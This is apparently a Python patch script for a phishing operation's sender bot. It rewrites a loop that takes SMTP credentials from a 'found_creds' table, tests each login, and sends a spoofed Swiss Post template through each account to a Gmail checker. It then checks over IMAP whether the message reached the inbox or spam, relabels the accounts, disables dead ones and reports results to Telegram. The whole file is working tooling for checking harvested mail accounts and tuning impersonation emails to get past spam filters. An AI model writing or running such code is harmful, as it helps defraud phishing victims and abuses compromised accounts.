#!/usr/bin/env python3
"""
Replace _smtp_health_check_loop with the PROVEN fresh_classify logic.
- Sends FRESH spoof from each SMTP to Gmail checker
- Waits 90s
- Checks IMAP inbox/spam with 3 retries
- Updates labels: SPOOF_INBOX / SPOOF_SPAM
- Marks AUTH dead as auth_ok=0
- Notifies admin via Telegram
- Runs every 3 hours
"""
import ast

TARGET = "/opt/darkvasend/auditguard/sender_bot.py"

with open(TARGET, "r") as f:
    lines = f.readlines()

# Find function boundaries
start_line = None
end_line = None
for i, line in enumerate(lines):
    if "async def _smtp_health_check_loop():" in line:
        start_line = i
    if start_line is not None and i > start_line and line.startswith("def run_sender"):
        end_line = i
        break

if start_line is None or end_line is None:
    print(f"ERROR: Could not find function boundaries (start={start_line}, end={end_line})")
    exit(1)

print(f"Replacing lines {start_line+1} to {end_line} (function body)")

NEW_FUNC = '''async def _smtp_health_check_loop():
    """Every 3h: send FRESH spoof from each SMTP, check IMAP inbox/spam, update labels, kill deads."""
    import sqlite3 as _sql, uuid as _uuid, imaplib, ssl as _ssl
    while True:
        await asyncio.sleep(10800)  # 3 hours
        try:
            print("[IMAP CHECK] Starting fresh delivery classification...", flush=True)
            from .campaign_sender import send_clean
            from .spoof_templates import get_template
            from .imap_checker import GMAIL_CHECKER, is_gmail_checker_configured
            from .db import send_telegram as _notify
            import smtplib

            if not is_gmail_checker_configured():
                print("[IMAP CHECK] Gmail checker not configured, skip", flush=True)
                continue

            tpl = get_template("swisspost")
            if not tpl:
                continue

            checker_email = GMAIL_CHECKER["email"]
            db = _sql.connect(DB_PATH, timeout=10)
            db.row_factory = _sql.Row
            rows = db.execute(
                "SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, context FROM found_creds WHERE auth_ok=1"
            ).fetchall()
            if not rows:
                db.close()
                continue

            run_id = "HC-" + _uuid.uuid4().hex[:6]
            markers = {}  # sid -> {host, marker}
            dead_ids = []

            # Phase 1: AUTH check + send fresh spoof
            for r in rows:
                sid = r["id"]
                host, port = r["smtp_host"], r["smtp_port"]
                user, pwd = r["smtp_user"], r["smtp_password"]
                smtp_config = {
                    "host": host, "port": port,
                    "username": user, "password": pwd,
                    "from_email": user,
                }

                # AUTH test
                try:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    if port == 465:
                        srv = smtplib.SMTP_SSL(host, port, timeout=8, context=ctx)
                    else:
                        srv = smtplib.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=_ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    srv.quit()
                except smtplib.SMTPAuthenticationError:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead_ids.append(sid)
                    print(f"[IMAP CHECK] #{sid} {host} AUTH DEAD", flush=True)
                    continue
                except Exception:
                    continue

                # Send fresh spoof
                marker = f"{run_id}-{sid}"
                subject = f"{tpl['subject']} [{marker}]"
                result = send_clean(
                    smtp_config, tpl["from_name"], tpl["from_email"],
                    checker_email, subject, tpl["html"],
                    tpl.get("reply_to", ""), None,
                )
                if result["success"]:
                    markers[sid] = {"host": host, "marker": marker, "old_ctx": r["context"] or ""}
                await asyncio.sleep(0.3)

            # Phase 2: Wait 90s for delivery
            print(f"[IMAP CHECK] {len(markers)} sent, {len(dead_ids)} dead, waiting 90s...", flush=True)
            await asyncio.sleep(90)

            # Phase 3: Check IMAP with 3 retries
            for attempt in range(3):
                try:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    imap = imaplib.IMAP4_SSL("imap.gmail.com", 993, ssl_context=ctx, timeout=20)
                    imap.login(GMAIL_CHECKER["email"], GMAIL_CHECKER["password"])

                    for sid, info in markers.items():
                        if "result" in info:
                            continue
                        search_q = f'SUBJECT "{info["marker"]}"'

                        imap.select("INBOX", readonly=True)
                        st, ids = imap.search(None, search_q)
                        if st == "OK" and ids[0] and ids[0].strip():
                            info["result"] = "INBOX"
                            continue

                        imap.select("[Gmail]/Spam", readonly=True)
                        st, ids = imap.search(None, search_q)
                        if st == "OK" and ids[0] and ids[0].strip():
                            info["result"] = "SPAM"
                            continue

                    imap.logout()
                except Exception as e:
                    print(f"[IMAP CHECK] IMAP error attempt {attempt+1}: {e}", flush=True)

                remaining = [s for s, i in markers.items() if "result" not in i]
                if not remaining:
                    break
                if attempt < 2:
                    await asyncio.sleep(15)

            # Phase 4: Update DB labels
            si = ss = nf = 0
            for sid, info in markers.items():
                result = info.get("result", "NOT_FOUND")
                old_ctx = info["old_ctx"]

                # Extract label suffix
                label = old_ctx.replace("Manual: ", "")
                for pfx in ["SPOOF_INBOX_", "SPOOF_SPAM_", "BASIQUE_INBOX_", "BASIQUE_SPAM_", "SPOOF_", "BASIQUE_", "STRIP_"]:
                    if label.startswith(pfx):
                        label = label[len(pfx):]
                        break

                if result == "INBOX":
                    new_ctx = f"Manual: SPOOF_INBOX_{label}"
                    si += 1
                elif result == "SPAM":
                    new_ctx = f"Manual: SPOOF_SPAM_{label}"
                    ss += 1
                else:
                    nf += 1
                    continue  # Keep old label if not found

                db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, sid))

            db.commit()
            db.close()

            summary = (
                f"IMAP CHECK AUTO ({run_id})\\n"
                f"SMTP: {len(rows)} | Dead: {len(dead_ids)}\\n"
                f"SPOOF INBOX: {si}\\n"
                f"SPOOF SPAM: {ss}\\n"
                f"Not found: {nf}"
            )
            print(f"[IMAP CHECK] SI:{si} SS:{ss} NF:{nf} DEAD:{len(dead_ids)}", flush=True)
            _notify(summary)

        except Exception as e:
            print(f"[IMAP CHECK] Error: {e}", flush=True)


'''

# Replace lines
new_lines = lines[:start_line] + [NEW_FUNC] + lines[end_line:]

with open(TARGET, "w") as f:
    f.writelines(new_lines)

# Verify syntax
ast.parse(open(TARGET).read())
print("HEALTH CHECK REPLACED + SYNTAX OK")
